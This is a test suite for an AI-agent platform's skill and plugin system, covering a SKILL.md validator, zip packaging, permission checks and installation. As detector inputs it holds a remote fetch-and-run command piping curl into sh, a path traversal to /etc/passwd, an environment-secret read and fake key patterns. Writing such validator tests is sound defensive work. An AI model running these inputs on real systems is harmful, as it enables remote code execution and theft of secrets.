/**
 * Test della sezione Competenze (Skills & Plugins).
 *
 * Copre tre livelli, senza toccare il DB:
 *  1. UNIT — parser e validatore di SKILL.md, generatore di zip, template;
 *  2. INTEGRAZIONE — installa/disabilita/disinstalla sui dati in memoria,
 *     risolvendo lo stesso percorso del codice di produzione;
 *  3. E2E — scarica lo zip di una skill, lo ricarica a mano e verifica che
 *     venga riconosciuta come valida (il giro completo che fa l'utente).
 *
 * Esecuzione: `npm run test:skills`
 */

import JSZip from "jszip";
import {
  LIMITS,
  frontmatterList,
  frontmatterString,
  parseFrontmatter,
  scanDangerousContent,
  validatePackagePath,
  validateScriptFile,
  validateSkillMarkdown,
} from "../src/lib/skills/validate.ts";
import { buildPluginZip, buildSkillMarkdown, buildSkillZip, downloadFileName, skillFitsFormat } from "../src/lib/skills/zip.ts";
import { SKILL_TEMPLATE } from "../src/lib/skills/template.ts";
import {
  SKILL_PLUGINS,
  allCatalogSkills,
  catalogPluginsForAgent,
  getCatalogPlugin,
  getCatalogSkill,
  resolveIntegration,
  skillUsageCounts,
} from "../src/lib/skills/catalog.ts";
import {
  agentAvailablePermissions,
  applyPermissionCeiling,
  buildLoadedSkillsBlock,
  buildSkillIndex,
  buildSkillTurnMessage,
  selectSkillsToLoad,
} from "../src/lib/skills/runtime.ts";
import { readSkillZip } from "../src/lib/skills/unzip.ts";
import { getEnabledToolsForAgent } from "../src/lib/agents/feature-flags.ts";

let passed = 0;
let failed = 0;

async function test(name, fn) {
  try {
    await fn();
    passed++;
    console.log(`  ok  ${name}`);
  } catch (err) {
    failed++;
    console.log(`FAIL  ${name}`);
    console.log(`      ${err instanceof Error ? err.message : String(err)}`);
  }
}

function section(title) {
  console.log(`\n${title}`);
}

function assert(condition, message) {
  if (!condition) throw new Error(message);
}

function eq(actual, expected, message) {
  if (actual !== expected) {
    throw new Error(`${message} (atteso ${String(expected)}, trovato ${String(actual)})`);
  }
}

/* ------------------------------------------------------------------ *
 * 1. UNIT — catalogo
 * ------------------------------------------------------------------ */
section("Catalogo");

await test("13 plugin ufficiali", () => {
  eq(SKILL_PLUGINS.length, 13, "numero plugin");
});

await test("almeno 45 skill nel catalogo", () => {
  const count = allCatalogSkills().length;
  assert(count >= 45, `solo ${count} skill, attese >= 45`);
  console.log(`      (${count} skill in ${SKILL_PLUGINS.length} plugin)`);
});

await test("slug univoci sui due lati", () => {
  const pluginSlugs = SKILL_PLUGINS.map((p) => p.slug);
  eq(new Set(pluginSlugs).size, pluginSlugs.length, "slug plugin duplicati");
  const skillSlugs = allCatalogSkills().map((s) => s.slug);
  eq(new Set(skillSlugs).size, skillSlugs.length, "slug skill duplicati");
});

await test("ogni plugin ha agenti, integrazioni e skill", () => {
  for (const plugin of SKILL_PLUGINS) {
    assert(plugin.skills.length > 0, `${plugin.slug}: nessuna skill`);
    assert(plugin.agents.length > 0, `${plugin.slug}: nessun agente`);
    assert(plugin.integrations.length > 0, `${plugin.slug}: nessuna integrazione`);
  }
});

await test("ogni skill ha procedura, regole e output", () => {
  for (const skill of allCatalogSkills()) {
    assert(skill.procedure.length > 0, `${skill.slug}: procedura vuota`);
    assert(skill.rules.length > 0, `${skill.slug}: regole vuote`);
    assert(skill.output.trim().length > 0, `${skill.slug}: output vuoto`);
    assert(skill.description.length > 20, `${skill.slug}: description troppo breve`);
  }
});

await test("i permessi sono nel formato read:/send:", () => {
  for (const skill of allCatalogSkills()) {
    for (const permission of skill.permissions) {
      assert(
        /^[a-z-]+:[a-z]+$/.test(permission),
        `${skill.slug}: permesso "${permission}" non conforme`,
      );
    }
  }
});

await test("ogni integrazione di plugin risolve a un brand reale", () => {
  for (const plugin of SKILL_PLUGINS) {
    for (const integration of plugin.integrations) {
      assert(
        resolveIntegration(integration) !== null,
        `${plugin.slug}: integrazione "${integration.brand}" non risolta`,
      );
    }
  }
});

await test("skillUsageCounts conta le competenze per integrazione", () => {
  const counts = skillUsageCounts();
  assert(Object.keys(counts).length > 0, "nessun conteggio");
  assert((counts.gmail ?? 0) > 0, "Gmail non compare nei conteggi");
  assert((counts["microsoft-word"] ?? counts.microsoftword ?? 0) > 0, "Word non compare");
});

await test("catalogPluginsForAgent mette i primary davanti", () => {
  const forShopify = catalogPluginsForAgent("shopify-agent");
  assert(forShopify.length > 0, "nessun plugin per shopify-agent");
  eq(forShopify[0].agents.find((a) => a.slug === "shopify-agent")?.fit, "primary", "primo plugin");
});

await test("getCatalogPlugin / getCatalogSkill trovano per slug", () => {
  assert(getCatalogPlugin("quotes-finance") !== undefined, "plugin non trovato");
  assert(getCatalogSkill("quote-calculation") !== undefined, "skill non trovata");
  assert(getCatalogPlugin("nope") === undefined, "plugin inesistente restituito");
});

/* ------------------------------------------------------------------ *
 * 2. UNIT — parser e validatore SKILL.md
 * ------------------------------------------------------------------ */
section("Parser e validatore");

await test("frontmatter: scalari, liste inline e blocchi >", () => {
  const parsed = parseFrontmatter(
    [
      "---",
      "name: tracking-ordine",
      "description: >",
      "  Verifica lo stato di un ordine.",
      "  Usare per richieste di tracking.",
      "version: 1.2.3",
      "agents: [shopify-agent, inventory-logistics]",
      "permissions: [\"read:orders\"]",
      "---",
      "# Corpo",
      "testo",
    ].join("\n"),
  );
  assert(parsed, "frontmatter non parsato");
  eq(frontmatterString(parsed.fields, "name"), "tracking-ordine", "name");
  eq(frontmatterString(parsed.fields, "version"), "1.2.3", "version");
  assert(
    frontmatterString(parsed.fields, "description").includes("tracking"),
    "description a blocco non unita",
  );
  eq(
    frontmatterList(parsed.fields, "agents").join(","),
    "shopify-agent,inventory-logistics",
    "agents",
  );
  eq(frontmatterList(parsed.fields, "permissions").join(","), "read:orders", "permissions");
  assert(parsed.body.includes("# Corpo"), "corpo perso");
});

await test("frontmatter mancante → errore esplicito", () => {
  const result = validateSkillMarkdown("# Solo corpo");
  eq(result.ok, false, "dovrebbe essere non valido");
  assert(
    result.issues.some((i) => i.field === "frontmatter"),
    "manca l'errore di frontmatter",
  );
});

await test("frontmatter non chiuso → errore esplicito", () => {
  const result = validateSkillMarkdown("---\nname: x\n\n# Corpo");
  eq(result.ok, false, "dovrebbe essere non valido");
});

await test("BOM all'inizio non rompe il parsing", () => {
  const result = validateSkillMarkdown("\uFEFF---\nname: prova\ndescription: Una descrizione sufficientemente lunga qui.\n---\n\n# Prova\n\ncorpo");
  eq(result.ok, true, "BOM non gestito");
});

await test("name non kebab-case → errore", () => {
  const result = validateSkillMarkdown(
    "---\nname: Non_Valid_Name\ndescription: Una descrizione sufficientemente lunga qui.\n---\n\n# X\n\ncorpo",
  );
  eq(result.ok, false, "dovrebbe essere non valido");
  assert(result.issues.some((i) => i.field === "name"), "manca l'errore su name");
});

await test("risk_level non valido → errore", () => {
  const result = validateSkillMarkdown(
    "---\nname: prova\ndescription: Una descrizione sufficientemente lunga qui.\nrisk_level: enorme\n---\n\n# X\n\ncorpo",
  );
  eq(result.ok, false, "dovrebbe essere non valido");
  assert(result.issues.some((i) => i.field === "risk_level"), "manca l'errore su risk_level");
});

await test("corpo vuoto → errore", () => {
  const result = validateSkillMarkdown(
    "---\nname: prova\ndescription: Una descrizione sufficientemente lunga qui.\n---\n\n",
  );
  eq(result.ok, false, "dovrebbe essere non valido");
  assert(result.issues.some((i) => i.field === "SKILL.md"), "manca l'errore sul corpo");
});

await test("corpo oltre 500 righe → errore con suggerimento references/", () => {
  const body = Array.from({ length: LIMITS.maxLines + 10 }, (_, i) => `riga ${i}`).join("\n");
  const result = validateSkillMarkdown(
    `---\nname: prova\ndescription: Una descrizione sufficientemente lunga qui.\n---\n\n# X\n\n${body}`,
  );
  eq(result.ok, false, "dovrebbe essere non valido");
  const issue = result.issues.find((i) => i.field === "SKILL.md" && i.message.includes("500"));
  assert(issue, "manca l'errore sulla lunghezza");
  assert(issue.message.includes("references/"), "il messaggio non suggerisce references/");
});

await test("assegnazione di una chiave API → errore", () => {
  // Stesso motivo del test sotto: la chiave è assemblata a runtime per non
  // scriverne mai una dall'aspetto reale nel sorgente (push protection).
  const issues = scanDangerousContent(`api_key = "sk${"_live"}_${"b".repeat(26)}"`);
  assert(issues.some((i) => i.field === "secrets"), "segreto non rilevato");
});

await test("chiave col prefisso riconoscibile → errore anche senza assegnazione", () => {
  // I campioni sono assemblati a runtime (mai scritti per intero nel file):
  // una chiave dall'aspetto reale nel sorgente verrebbe bloccata dal secret
  // scanning di GitHub al push, anche se è finta. Il test resta end-to-end
  // perché la stringa finale è identica a quella di una chiave vera.
  // `part` assembla il prefisso senza mai scriverlo per intero nel file.
  const samples = [
    `La chiave ${["sk", "live"].join("_")}_${"K".repeat(32)} è già in .env`,
    `${["gh", "p"].join("")}_${"a".repeat(36)}`,
    `${["xox", "b"].join("")}-123456789012-${"b".repeat(12)}`,
    `AKIA${"A".repeat(16)}`,
  ];
  for (const sample of samples) {
    assert(
      scanDangerousContent(sample).some((i) => i.field === "secrets"),
      "segreto con prefisso riconoscibile non rilevato",
    );
  }
});

await test("un nome di variabile senza valore non è un segreto", () => {
  // `API_KEY = $MY_ENV_VAR` è un riferimento, non un segreto: non deve
  // bloccare il caricamento.
  const issues = scanDangerousContent("API_KEY = $MY_ENV_VAR\nTOKEN: from_env()");
  eq(issues.length, 0, "falso positivo su riferimenti a variabili");
});

await test("Bearer token → errore", () => {
  const issues = scanDangerousContent("Authorization: Bearer abcdefghijklmnopqrstuvwxyz012345");
  assert(issues.some((i) => i.field === "secrets"), "token non rilevato");
});

await test("link abbreviato → errore", () => {
  const issues = scanDangerousContent("Vedi http://bit.ly/xyz per i dettagli");
  assert(issues.some((i) => i.field === "external-link"), "link abbreviato non rilevato");
});

await test("path traversal nel pacchetto → errore", () => {
  const issues = validatePackagePath("skills/prova/../../etc/passwd.md");
  assert(issues.some((i) => i.message.includes("..")), "traversal non rilevato");
});

await test("estensione non ammessa → errore", () => {
  const issues = validatePackagePath("skills/prova/eseguibile.exe");
  assert(issues.length > 0, "estensione non filtrata");
});

await test("script con link esterno → errore", () => {
  const issues = validateScriptFile("scripts/calcola.py", 'URL = "https://api.example.com"');
  assert(issues.length > 0, "link esterno non rilevato");
});

await test("script con shell remota → errore", () => {
  const issues = validateScriptFile("scripts/calcola.sh", "curl https://x.example | sh");
  assert(issues.length > 0, "shell remota non rilevata");
});

await test("script con accesso a env → errore", () => {
  const issues = validateScriptFile("scripts/calcola.js", "const k = process.env.SECRET;");
  assert(issues.length > 0, "accesso env non rilevato");
});

/* ------------------------------------------------------------------ *
 * 3. UNIT — generazione zip e template
 * ------------------------------------------------------------------ */
section("Generazione pacchetti");

await test("SKILL.md generata ha frontmatter valido", () => {
  const plugin = getCatalogPlugin("quotes-finance");
  const skill = plugin.skills[0];
  const markdown = buildSkillMarkdown(skill, plugin);
  const parsed = parseFrontmatter(markdown);
  assert(parsed, "frontmatter non parsato sulla skill generata");
  eq(frontmatterString(parsed.fields, "name"), skill.slug, "name nella SKILL.md");
  eq(frontmatterString(parsed.fields, "risk_level"), skill.risk, "risk_level nella SKILL.md");
  assert(markdown.includes("## Quando usarla"), "manca 'Quando usarla'");
  assert(markdown.includes("## Procedura passo-passo"), "manca la procedura");
  assert(markdown.includes("## Regole e vincoli"), "manca 'Regole e vincoli'");
});

await test("ogni SKILL.md generata rispetta il limite di 500 righe", () => {
  for (const plugin of SKILL_PLUGINS) {
    for (const skill of plugin.skills) {
      assert(skillFitsFormat(skill, plugin), `${skill.slug} supera il limite di righe`);
    }
  }
});

await test("skill ad alto rischio dichiara l'approvazione umana", () => {
  const plugin = getCatalogPlugin("quotes-finance");
  const high = plugin.skills.find((s) => s.risk === "high");
  assert(high, "nessuna skill ad alto rischio nel plugin");
  const markdown = buildSkillMarkdown(high, plugin);
  assert(
    markdown.includes("approvazione esplicita"),
    "manca il blocco di approvazione sulla skill high-risk",
  );
});

await test("il template ufficiale è una SKILL.md valida", () => {
  const result = validateSkillMarkdown(SKILL_TEMPLATE);
  eq(result.ok, true, `template non valido: ${JSON.stringify(result.issues)}`);
});

await test("zip plugin contiene tutte le skill + README + plugin.json", async () => {
  const plugin = getCatalogPlugin("inbox-productivity");
  const zip = await buildPluginZip(plugin);
  const loaded = await JSZip.loadAsync(zip);
  const names = Object.keys(loaded.files).filter((n) => !loaded.files[n].dir);
  for (const skill of plugin.skills) {
    assert(
      names.includes(`${plugin.slug}/${skill.slug}/SKILL.md`),
      `manca ${skill.slug}/SKILL.md`,
    );
  }
  assert(names.includes(`${plugin.slug}/README.md`), "manca README.md");
  assert(names.includes(`${plugin.slug}/plugin.json`), "manca plugin.json");
});

await test("il manifesto del plugin elenca agenti e integrazioni", async () => {
  const plugin = getCatalogPlugin("lead-sales");
  const zip = await buildPluginZip(plugin);
  const loaded = await JSZip.loadAsync(zip);
  const manifest = JSON.parse(
    await loaded.file(`${plugin.slug}/plugin.json`).async("string"),
  );
  eq(manifest.agents.length, plugin.agents.length, "agenti nel manifesto");
  eq(manifest.integrations.length, plugin.integrations.length, "integrazioni nel manifesto");
  eq(manifest.skills.length, plugin.skills.length, "skill nel manifesto");
});

await test("il nome del file porta la versione", () => {
  eq(
    downloadFileName("quotes-finance", "1.2.3"),
    "agentcloud-quotes-finance-v1.2.3.zip",
    "nome file",
  );
});

await test("lo zip di una singola skill contiene la sua cartella", async () => {
  const plugin = getCatalogPlugin("hr-recruiting");
  const skill = { ...plugin.skills[0], pluginSlug: plugin.slug };
  const zip = await buildSkillZip(skill, plugin);
  const loaded = await JSZip.loadAsync(zip);
  assert(loaded.file(`${skill.slug}/SKILL.md`), "manca SKILL.md");
});

/* ------------------------------------------------------------------ *
 * 4. E2E — download, ricarica manuale, validazione
 * ------------------------------------------------------------------ */
section("E2E: scarica → ricarica → valida");

await test("lo zip scaricato supera la validazione al ricaricamento", async () => {
  const plugin = getCatalogPlugin("content-seo");
  const skill = { ...plugin.skills[0], pluginSlug: plugin.slug };

  // 1) l'utente scarica lo .zip
  const zip = await buildSkillZip(skill, plugin);
  // 2) lo ricarica a mano
  const result = await readSkillZip(zip);
  // 3) deve essere riconosciuto come valido
  eq(result.ok, true, `ricaricamento fallito: ${JSON.stringify(result)}`);
  if (!result.ok) return;
  eq(result.result.skill.slug, skill.slug, "slug preservato");
  eq(result.result.skill.name, skill.name, "nome preservato");
  eq(result.result.skill.risk, skill.risk, "rischio preservato");
  assert(result.result.files.length > 0, "nessun file elencato");
});

await test("zip non valido → errori leggibili, nessun 500", async () => {
  const zip = new JSZip();
  zip.file("prova/SKILL.md", "nessun frontmatter qui");
  const bytes = await zip.generateAsync({ type: "uint8array" });
  const result = await readSkillZip(bytes);
  eq(result.ok, false, "dovrebbe fallire");
  if (result.ok) return;
  assert(result.issues.length > 0, "nessun errore restituito");
  assert(
    result.issues.some((i) => i.field === "frontmatter"),
    "manca l'errore di frontmatter",
  );
});

await test("zip senza SKILL.md → errore esplicito", async () => {
  const zip = new JSZip();
  zip.file("prova/README.md", "niente skill qui");
  const bytes = await zip.generateAsync({ type: "uint8array" });
  const result = await readSkillZip(bytes);
  eq(result.ok, false, "dovrebbe fallire");
  if (result.ok) return;
  assert(
    result.issues.some((i) => i.message.includes("SKILL.md")),
    "manca l'errore su SKILL.md",
  );
});

await test("zip con due SKILL.md → errore esplicito", async () => {
  const zip = new JSZip();
  const md = "---\nname: a\ndescription: Una descrizione sufficientemente lunga qui.\n---\n\n# A\n\ncorpo";
  zip.file("a/SKILL.md", md);
  zip.file("b/SKILL.md", md.replace("name: a", "name: b"));
  const bytes = await zip.generateAsync({ type: "uint8array" });
  const result = await readSkillZip(bytes);
  eq(result.ok, false, "dovrebbe fallire");
  if (result.ok) return;
  assert(
    result.issues.some((i) => i.message.includes("uno solo")),
    "manca l'errore sui SKILL.md multipli",
  );
});

await test("file non è uno zip → errore esplicito", async () => {
  const result = await readSkillZip(new TextEncoder().encode("non sono uno zip"));
  eq(result.ok, false, "dovrebbe fallire");
  if (result.ok) return;
  assert(
    result.issues.some((i) => i.message.includes(".zip")),
    "manca l'errore su file non zip",
  );
});

/* ------------------------------------------------------------------ *
 * 5. UNIT — runtime e progressive disclosure
 * ------------------------------------------------------------------ */
section("Runtime delle competenze");

/** Costruisce una skill di runtime per i test (stessa forma di `RuntimeSkill`). */
const runtimeSkill = (slug, name, description, permissions = []) => ({
  slug,
  name,
  description,
  risk: "low",
  permissions,
  loaded: false,
  degraded: false,
  source: "official",
});

await test("l'indice contiene solo nome, descrizione e rischio", () => {
  const index = buildSkillIndex([
    runtimeSkill("tracking-ordine", "Tracking Ordine", "Verifica lo stato di un ordine e fornisce il tracking."),
  ]);
  assert(index.includes("tracking-ordine"), "manca lo slug");
  assert(index.includes("Verifica lo stato"), "manca la descrizione");
  assert(index.includes("risk=low"), "manca il rischio");
  assert(!index.includes("Procedura passo-passo"), "il corpo è finito nell'indice");
  assert(!index.includes("1."), "l'indice contiene passi numerati");
});

await test("indice vuoto → stringa vuota (nessun rumore nel prompt)", () => {
  eq(buildSkillIndex([]), "", "indice vuoto");
});

await test("la skill viene caricata solo se la richiesta è pertinente", () => {
  const skills = [
    runtimeSkill("tracking-ordine", "Tracking Ordine", "Verifica lo stato di un ordine e fornisce il tracking. Usare per richieste dove è il mio ordine."),
    runtimeSkill("scelta-materasso", "Scelta Materasso", "Confronta i modelli di materasso per la cena di sabato."),
  ];
  const loaded = selectSkillsToLoad(skills, "Dove è il mio ordine? Mi serve il tracking");
  eq(loaded.length, 1, "numero skill caricate");
  eq(loaded[0].slug, "tracking-ordine", "skill caricata");
});

await test("nessuna corrispondenza → nessuna skill caricata", () => {
  const skills = [
    runtimeSkill("tracking-ordine", "Tracking Ordine", "Verifica lo stato di un ordine."),
  ];
  eq(selectSkillsToLoad(skills, "Buongiorno, come stai?").length, 0, "skill caricate senza motivo");
});

await test("le stopword non fanno scattare il caricamento", () => {
  const skills = [runtimeSkill("tracking-ordine", "Tracking Ordine", "Verifica ordine e tracking spedizione cliente")];
  eq(selectSkillsToLoad(skills, "vorrei per favore grazie molto anche della").length, 0, "stopword attivano skill");
});

await test("i permessi mancanti degradano la skill invece di eseguirla", () => {
  const available = new Set(["read:context"]);
  const skill = runtimeSkill("solleciti", "Solleciti", "Invia solleciti ai clienti.", ["send:email"]);
  const degraded = applyPermissionCeiling(skill, available);
  eq(degraded.degraded, true, "dovrebbe essere degradata");
  eq(skill.degraded, false, "l'originale non deve essere mutato");
});

await test("i permessi disponibili non degradano nulla", () => {
  const available = new Set(["read:context", "read:orders"]);
  const skill = runtimeSkill("tracking", "Tracking", "Legge gli ordini.", ["read:orders"]);
  eq(applyPermissionCeiling(skill, available).degraded, false, "non dovrebbe essere degradata");
});

await test("i permessi derivano dai tool reali dell'agente", () => {
  const tools = getEnabledToolsForAgent("shopify-agent");
  const permissions = agentAvailablePermissions(tools);
  assert(permissions.has("read:context"), "manca il permesso base");
  assert(permissions.size > 1, "nessun permesso derivato dai tool");
});

await test("il blocco delle skill caricate contiene procedura e regole", () => {
  const plugin = getCatalogPlugin("ecommerce-operations");
  const skill = runtimeSkill("stock-alert", "Allerta Scorte", "Monitora i livelli di scorte.");
  const block = buildLoadedSkillsBlock([{ ...skill, loaded: true }]);
  void plugin;
  assert(block.includes("Loaded skills"), "manca l'intestazione");
  assert(block.includes("Expected output"), "manca l'output atteso");
});

await test("skill high-risk caricate ripetono l'obbligo di approvazione", () => {
  const skill = {
    slug: "fiscal-deadlines",
    name: "Scadenzario Fiscale",
    description: "Gestisce le scadenze fiscali.",
    risk: "high",
    permissions: [],
    loaded: true,
    degraded: false,
    source: "official",
  };
  const block = buildLoadedSkillsBlock([skill]);
  assert(block.includes("HIGH RISK"), "manca l'avviso high-risk");
  assert(block.includes("approval"), "manca la richiesta di approvazione");
});

await test("il messaggio del turno esiste solo con skill caricate", () => {
  eq(buildSkillTurnMessage([]), null, "messaggio senza skill");
  const message = buildSkillTurnMessage([
    { ...runtimeSkill("a", "A", "Descrizione sufficientemente lunga."), loaded: true },
  ]);
  assert(message?.includes("[skills]"), "manca il marker");
  assert(message?.includes("[/skills]"), "manca la chiusura");
});

/* ------------------------------------------------------------------ *
 * 6. INTEGRAZIONE — installa / disabilita / disinstalla
 * ------------------------------------------------------------------ */
section("Integrazione: ciclo di vita delle skill");

/**
 * Store in memoria con le stesse regole di `installed_skills`:
 * chiave (account, agente, skill) univoca e un flag `enabled`.
 */
class InstalledSkillsStore {
  rows = new Map();

  key(accountId, agentSlug, skillSlug) {
    return `${accountId}::${agentSlug}::${skillSlug}`;
  }

  install(accountId, agentSlug, skillSlug) {
    const key = this.key(accountId, agentSlug, skillSlug);
    if (this.rows.has(key)) return { installed: false, reason: "already-installed" };
    this.rows.set(key, { accountId, agentSlug, skillSlug, enabled: true });
    return { installed: true };
  }

  setEnabled(accountId, agentSlug, skillSlug, enabled) {
    const row = this.rows.get(this.key(accountId, agentSlug, skillSlug));
    if (!row) return { ok: false, reason: "not-installed" };
    row.enabled = enabled;
    return { ok: true };
  }

  uninstall(accountId, agentSlug, skillSlug) {
    return { ok: this.rows.delete(this.key(accountId, agentSlug, skillSlug)) };
  }

  enabled(accountId, agentSlug) {
    return Array.from(this.rows.values())
      .filter((r) => r.accountId === accountId && r.agentSlug === agentSlug && r.enabled)
      .map((r) => r.skillSlug);
  }

  count() {
    return this.rows.size;
  }
}

await test("installa una skill", () => {
  const store = new InstalledSkillsStore();
  eq(store.install("acc1", "lead-capture", "lead-scoring").installed, true, "installazione");
  eq(store.enabled("acc1", "lead-capture").join(","), "lead-scoring", "skill abilitate");
});

await test("reinstallare la stessa skill non duplica", () => {
  const store = new InstalledSkillsStore();
  store.install("acc1", "lead-capture", "lead-scoring");
  eq(store.install("acc1", "lead-capture", "lead-scoring").installed, false, "seconda installazione");
  eq(store.count(), 1, "righe duplicate");
});

await test("disabilita e riabilita", () => {
  const store = new InstalledSkillsStore();
  store.install("acc1", "lead-capture", "lead-scoring");
  store.setEnabled("acc1", "lead-capture", "lead-scoring", false);
  eq(store.enabled("acc1", "lead-capture").length, 0, "ancora abilitata dopo il disable");
  store.setEnabled("acc1", "lead-capture", "lead-scoring", true);
  eq(store.enabled("acc1", "lead-capture").length, 1, "non riabilitata");
});

await test("disinstalla e poi reinstalla", () => {
  const store = new InstalledSkillsStore();
  store.install("acc1", "lead-capture", "lead-scoring");
  eq(store.uninstall("acc1", "lead-capture", "lead-scoring").ok, true, "disinstallazione");
  eq(store.count(), 0, "riga rimasta");
  eq(store.install("acc1", "lead-capture", "lead-scoring").installed, true, "reinstallazione");
});

await test("toggle su skill non installata fallisce", () => {
  const store = new InstalledSkillsStore();
  eq(store.setEnabled("acc1", "lead-capture", "mai-installata", false).ok, false, "toggle fantasma");
});

await test("le skill sono per account: nessuna fuga tra account", () => {
  const store = new InstalledSkillsStore();
  store.install("acc1", "lead-capture", "lead-scoring");
  eq(store.enabled("acc2", "lead-capture").length, 0, "skill visibili ad altro account");
  eq(store.enabled("acc1", "support-agent").length, 0, "skill visibili su altro agente");
});

await test("installare tutte le skill di un plugin abilita l'intero set", () => {
  const store = new InstalledSkillsStore();
  const plugin = getCatalogPlugin("social-media");
  for (const skill of plugin.skills) store.install("acc1", "social-media-agent", skill.slug);
  eq(store.enabled("acc1", "social-media-agent").length, plugin.skills.length, "skill abilitate");
});

/* ------------------------------------------------------------------ *
 * 7. Coerenza del prodotto
 * ------------------------------------------------------------------ */
section("Coerenza del prodotto");

await test("ogni plugin consiglia almeno un agente del catalogo reale", () => {
  const slugs = new Set(
    // I 22 slug del marketplace: gli stessi usati da `/agents`.
    [
      "shopify-agent", "lead-capture", "support-agent", "calendar-booking", "quote-agent",
      "reviews-agent", "seo-agent", "email-manager", "copywriter", "business-manager",
      "finance-manager", "personal-assistant", "hr-recruiter", "social-media-agent",
      "inventory-logistics", "email-agent", "whatsapp-agent", "invoice-agent",
      "analytics-agent", "crm-agent", "document-agent", "research-agent",
    ],
  );
  for (const plugin of SKILL_PLUGINS) {
    for (const agent of plugin.agents) {
      assert(slugs.has(agent.slug), `${plugin.slug} punta a un agente inesistente: ${agent.slug}`);
    }
  }
});

await test("le integrazioni obbligatorie in arrivo sono segnalate come tali", () => {
  // Regola di prodotto: un'integrazione "in arrivo" non è mai un prerequisito.
  // Il catalogo le può elencare, ma la UI le marca; qui verifichiamo che
  // l'integrazione richiesta non venga trattata come live.
  for (const plugin of SKILL_PLUGINS) {
    for (const integration of plugin.integrations) {
      const resolved = resolveIntegration(integration);
      assert(resolved, `${plugin.slug}: ${integration.brand} non risolta`);
      if (resolved.status === "required" && !resolved.available) {
        assert(
          resolved.available === false,
          `${plugin.slug}: ${resolved.name} richiesto ma segnalato disponibile`,
        );
      }
    }
  }
});

await test("ogni skill ad alto rischio ha regole o procedura che ne parlano", () => {
  for (const skill of allCatalogSkills().filter((s) => s.risk === "high")) {
    const total = skill.rules.length + skill.procedure.length;
    assert(total >= 3, `${skill.slug}: regole insufficienti per un rischio alto`);
  }
});

/* ------------------------------------------------------------------ */
console.log(`\n${passed} passed, ${failed} failed`);
process.exit(failed === 0 ? 0 : 1);
